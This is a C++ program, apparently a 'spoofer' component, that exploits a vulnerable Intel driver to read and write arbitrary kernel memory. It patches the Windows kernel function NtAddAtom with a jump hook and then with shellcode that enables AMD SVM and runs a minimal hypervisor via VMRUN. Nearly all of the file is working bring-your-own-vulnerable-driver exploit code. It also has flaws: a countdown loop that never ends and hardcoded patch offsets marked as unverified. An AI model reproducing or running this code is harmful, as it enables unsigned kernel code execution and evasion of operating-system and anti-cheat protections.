—»// SVMHypervisorV6Minimal.cpp
// MINIMAL TEST - Guest immediately VMEXITs on CPUID
// No complex guest code - just verify VMRUN works

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== MINIMAL SHELLCODE ====================
// Goal: Just verify VMRUN works
// 1. Enable SVME
// 2. Set VM_HSAVE_PA
// 3. Setup VMCB with current state
// 4. Guest RIP = address of CPUID instruction (in our shellcode)
// 5. VMRUN - guest immediately VMEXITs on CPUID
// 6. Return

uint8_t minimalShellcode[] = {
    // ===== Prologue =====
    0x55, // push rbp
    0x48,
    0x89,
    0xE5, // mov rbp, rsp
    0x41,
    0x50, // push r8
    0x41,
    0x51, // push r9
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx
    0x53, // push rbx
    0x56, // push rsi
    0x57, // push rdi

    // ===== Step 1: Enable EFER.SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F,
    0x32, // rdmsr
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000 (SVME)
    0x0F,
    0x30, // wrmsr

    // ===== Step 2: Set VM_HSAVE_PA MSR =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117 (VM_HSAVE_PA)
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // mov eax, hsave_pa_low  @PATCH1
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // mov edx, hsave_pa_high @PATCH2
    0x0F,
    0x30, // wrmsr

    // ===== Step 3: Load VMCB_VA into RBX =====
    0x48,
    0xBB,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rbx, vmcb_va @PATCH3

    // ===== Step 4: Read and store all required VMCB fields =====
    // CR0
    0x0F,
    0x20,
    0xC0, // mov rax, cr0
    0x48,
    0x89,
    0x83,
    0x58,
    0x05,
    0x00,
    0x00, // mov [rbx+0x558], rax
    // CR3
    0x0F,
    0x20,
    0xD8, // mov rax, cr3
    0x48,
    0x89,
    0x83,
    0x50,
    0x05,
    0x00,
    0x00, // mov [rbx+0x550], rax
    // CR4
    0x0F,
    0x20,
    0xE0, // mov rax, cr4
    0x48,
    0x89,
    0x83,
    0x48,
    0x05,
    0x00,
    0x00, // mov [rbx+0x548], rax
    // EFER
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x48,
    0xC1,
    0xE2,
    0x20, // shl rdx, 32
    0x48,
    0x09,
    0xD0, // or rax, rdx
    0x48,
    0x89,
    0x83,
    0xD0,
    0x04,
    0x00,
    0x00, // mov [rbx+0x4D0], rax

    // GDTR
    0x48,
    0x83,
    0xEC,
    0x10, // sub rsp, 16
    0x0F,
    0x01,
    0x04,
    0x24, // sgdt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x64,
    0x04,
    0x00,
    0x00, // mov [rbx+0x464], eax (GDTR limit)
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x68,
    0x04,
    0x00,
    0x00, // mov [rbx+0x468], rax (GDTR base)
    // IDTR
    0x0F,
    0x01,
    0x0C,
    0x24, // sidt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x89,
    0x83,
    0x84,
    0x04,
    0x00,
    0x00, // mov [rbx+0x484], eax (IDTR limit)
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x48,
    0x89,
    0x83,
    0x88,
    0x04,
    0x00,
    0x00, // mov [rbx+0x488], rax (IDTR base)
    0x48,
    0x83,
    0xC4,
    0x10, // add rsp, 16

    // Segment selectors
    0x8C,
    0xC8, // mov ax, cs
    0x66,
    0x89,
    0x83,
    0x10,
    0x04,
    0x00,
    0x00, // mov [rbx+0x410], ax
    0x8C,
    0xD0, // mov ax, ss
    0x66,
    0x89,
    0x83,
    0x20,
    0x04,
    0x00,
    0x00, // mov [rbx+0x420], ax
    0x8C,
    0xD8, // mov ax, ds
    0x66,
    0x89,
    0x83,
    0x30,
    0x04,
    0x00,
    0x00, // mov [rbx+0x430], ax
    0x8C,
    0xC0, // mov ax, es
    0x66,
    0x89,
    0x83,
    0x00,
    0x04,
    0x00,
    0x00, // mov [rbx+0x400], ax

    // Segment limits = 0xFFFFFFFF
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // mov eax, 0xFFFFFFFF
    0x89,
    0x83,
    0x04,
    0x04,
    0x00,
    0x00, // mov [rbx+0x404], eax (ES)
    0x89,
    0x83,
    0x14,
    0x04,
    0x00,
    0x00, // mov [rbx+0x414], eax (CS)
    0x89,
    0x83,
    0x24,
    0x04,
    0x00,
    0x00, // mov [rbx+0x424], eax (SS)
    0x89,
    0x83,
    0x34,
    0x04,
    0x00,
    0x00, // mov [rbx+0x434], eax (DS)

    // Segment attributes
    0x66,
    0xC7,
    0x83,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x02, // CS = 0x029B
    0x66,
    0xC7,
    0x83,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // SS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // DS = 0x0093
    0x66,
    0xC7,
    0x83,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // ES = 0x0093

    // RFLAGS
    0x9C, // pushfq
    0x58, // pop rax
    0x48,
    0x89,
    0x83,
    0x70,
    0x05,
    0x00,
    0x00, // mov [rbx+0x570], rax

    // RSP (save current)
    0x48,
    0x89,
    0xE0, // mov rax, rsp
    0x48,
    0x89,
    0x83,
    0xD8,
    0x05,
    0x00,
    0x00, // mov [rbx+0x5D8], rax

    // ASID = 1
    0xC7,
    0x43,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x58], 1

    // ===== Step 5: Set intercepts (CPUID + VMRUN) =====
    0xC7,
    0x43,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x00, // mov dword [rbx+0x0C], 0x40000 (CPUID)
    0xC7,
    0x43,
    0x10,
    0x01,
    0x00,
    0x00,
    0x00, // mov dword [rbx+0x10], 1 (VMRUN)

    // ===== Step 6: Set guest RIP = address of CPUID instruction below =====
    // The CPUID is embedded in this shellcode - we'll set RIP to point to it
    0x48,
    0x8D,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00, // lea rax, [rip+XX] -> CPUID location @PATCH_RIP
    0x48,
    0x89,
    0x83,
    0x78,
    0x05,
    0x00,
    0x00, // mov [rbx+0x578], rax

    // ===== Step 7: Load VMCB_PA into RAX =====
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, vmcb_pa @PATCH4

    // ===== Step 8: Save guest RAX (needs VMCB PA for after VMEXIT) =====
    // After VMEXIT on CPUID, we skip the instruction and continue at our return
    // code
    // Guest RAX doesn't matter since we immediately exit after VMEXIT
    0x48,
    0xC7,
    0x83,
    0xF8,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov qword [rbx+0x5F8], 0

    // ===== Step 9: VMSAVE - capture hidden state =====
    0x0F,
    0x01,
    0xDB, // vmsave rax

    // ===== Step 10: CLI + VMLOAD + VMRUN =====
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload rax
    0x0F,
    0x01,
    0xD8, // vmrun rax
    // =========== VMEXIT returns here ===========

    // ===== Step 11: Post-VMEXIT cleanup =====
    0x0F,
    0x01,
    0xDB, // vmsave rax (save guest state)
    0x0F,
    0x01,
    0xDC, // stgi
    0xFB, // sti

    // ===== Read VMEXIT code into R8 =====
    0x4C,
    0x8B,
    0x43,
    0x70, // mov r8, [rbx+0x70] (exit code)

    // ===== Epilogue =====
    0x4C,
    0x89,
    0xC0, // mov rax, r8 (return exit code)
    0x5F, // pop rdi
    0x5E, // pop rsi
    0x5B, // pop rbx
    0x5A, // pop rdx
    0x59, // pop rcx
    0x48,
    0x83,
    0xC4,
    0x08, // add rsp, 8 (skip rax)
    0x41,
    0x59, // pop r9
    0x41,
    0x58, // pop r8
    0x5D, // pop rbp
    0xC3, // ret

    // ===== CPUID instruction - guest will execute this =====
    0x0F,
    0xA2, // cpuid @CPUID_LOCATION
    0xC3, // ret (never reached)
};

// Find offsets for patching
// Run Python to calculate these
void CalculateOffsets() {
  printf("Shellcode size: %zu bytes\n", sizeof(minimalShellcode));

  // Find HSAVE_PA patches (B8 followed by BA)
  for (size_t i = 0; i < sizeof(minimalShellcode) - 10; i++) {
    if (minimalShellcode[i] == 0xB8 && minimalShellcode[i + 5] == 0xBA) {
      printf("HSAVE_PA_LOW at offset: %zu\n", i + 1);
      printf("HSAVE_PA_HIGH at offset: %zu\n", i + 6);
      break;
    }
  }

  // Find VMCB_VA patch (48 BB)
  for (size_t i = 0; i < sizeof(minimalShellcode) - 10; i++) {
    if (minimalShellcode[i] == 0x48 && minimalShellcode[i + 1] == 0xBB) {
      printf("VMCB_VA at offset: %zu\n", i + 2);
      break;
    }
  }

  // Find VMCB_PA patch (48 B8 after VMCB_VA)
  int found = 0;
  for (size_t i = 0; i < sizeof(minimalShellcode) - 10; i++) {
    if (minimalShellcode[i] == 0x48 && minimalShellcode[i + 1] == 0xB8) {
      if (found > 0) { // Skip first occurrence (might be other mov rax)
        printf("VMCB_PA at offset: %zu\n", i + 2);
        break;
      }
      found++;
    }
  }

  // Find CPUID location (0F A2)
  for (size_t i = sizeof(minimalShellcode) - 5; i >= 0; i--) {
    if (minimalShellcode[i] == 0x0F && minimalShellcode[i + 1] == 0xA2) {
      printf("CPUID at offset: %zu\n", i);
      break;
    }
  }

  // Find LEA for RIP patch (48 8D 05)
  for (size_t i = 0; i < sizeof(minimalShellcode) - 10; i++) {
    if (minimalShellcode[i] == 0x48 && minimalShellcode[i + 1] == 0x8D &&
        minimalShellcode[i + 2] == 0x05) {
      printf("LEA RIP displacement at offset: %zu\n", i + 3);
      break;
    }
  }
}

int main() {
  printf("================================================================\n");
  printf("    SVM HYPERVISOR V6 MINIMAL - Immediate CPUID VMEXIT Test\n");
  printf(
      "================================================================\n\n");

  CalculateOffsets();

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (!kernelExAllocatePool) {
    printf("[-] ExAllocatePoolWithTag not found!\n");
    CloseHandle(hDevice);
    return 1;
  }

  // Allocate kernel memory
  printf("\n=== Allocate Kernel Memory ===\n");
  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t, uint32_t, uint64_t, uint32_t>(
      &allocatedAddr, kernelExAllocatePool, 0, 0x2000, 0x484D5653);
  if (!allocatedAddr || allocatedAddr < 0xFFFF000000000000ULL) {
    printf("[-] Allocation failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB VA: 0x%llX, PA: 0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE VA: 0x%llX, PA: 0x%llX\n", hsaveVa, hsavePa);

  // Zero memory
  uint8_t zeros[0x1000];
  memset(zeros, 0, sizeof(zeros));
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  printf("[+] Memory zeroed\n");

  // Patch shellcode
  printf("\n=== Patch Shellcode ===\n");
  uint8_t patchedCode[sizeof(minimalShellcode)];
  memcpy(patchedCode, minimalShellcode, sizeof(patchedCode));

// These offsets need to be verified - using CalculateOffsets output
#define HSAVE_PA_LOW_OFF 37
#define HSAVE_PA_HIGH_OFF 42
#define VMCB_VA_OFF 50
#define VMCB_PA_OFF 287
#define LEA_RIP_DISP_OFF 259

  *(uint32_t *)&patchedCode[HSAVE_PA_LOW_OFF] =
      (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patchedCode[HSAVE_PA_HIGH_OFF] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patchedCode[VMCB_VA_OFF] = vmcbVa;
  *(uint64_t *)&patchedCode[VMCB_PA_OFF] = vmcbPa;

  // Calculate LEA displacement to CPUID
  // CPUID is at end of shellcode - 3 bytes (before final ret)
  size_t cpuidOffset = sizeof(minimalShellcode) - 3;
  size_t leaEnd =
      LEA_RIP_DISP_OFF + 4; // LEA instruction ends 4 bytes after displacement
  int32_t displacement = (int32_t)(cpuidOffset - leaEnd);
  *(int32_t *)&patchedCode[LEA_RIP_DISP_OFF] = displacement;

  printf("[+] Patched shellcode (%zu bytes)\n", sizeof(patchedCode));
  printf("    LEA displacement: %d (CPUID at offset %zu)\n", displacement,
         cpuidOffset);

  printf("\nPress ENTER to execute...\n");
  getchar();

  // Execute
  uint8_t backup[512];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patchedCode));
  WriteToReadOnlyMemory(kernelNtAddAtom, patchedCode, sizeof(patchedCode));

  printf("[*] Executing...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patchedCode));
  printf("[+] NtAddAtom restored\n");

  // Check result
  printf("\n=== Results ===\n");
  printf("[*] Return value (should be VMEXIT code): 0x%lX\n", result);

  uint64_t exitCode = 0;
  ReadMemory(vmcbVa + 0x70, &exitCode, sizeof(exitCode));
  printf("[*] VMCB VMEXIT code: 0x%llX\n", exitCode);

  if (exitCode == 0x72) {
    printf("\n[+] SUCCESS! VMEXIT due to CPUID intercept!\n");
    printf("[+] HYPERVISOR IS WORKING!\n");
  } else if (exitCode == 0xFFFFFFFFFFFFFFFFULL || exitCode == (uint64_t)-1) {
    printf("[*] VMEXIT_INVALID (-1) - VMCB consistency check failed\n");
  } else {
    printf("[*] VMEXIT code: 0x%llX (check AMD manual for meaning)\n",
           exitCode);
  }

  CloseHandle(hDevice);
  return 0;
}
—»25file:///c:/inject/Spoofers/SVMHypervisorV6Minimal.cpp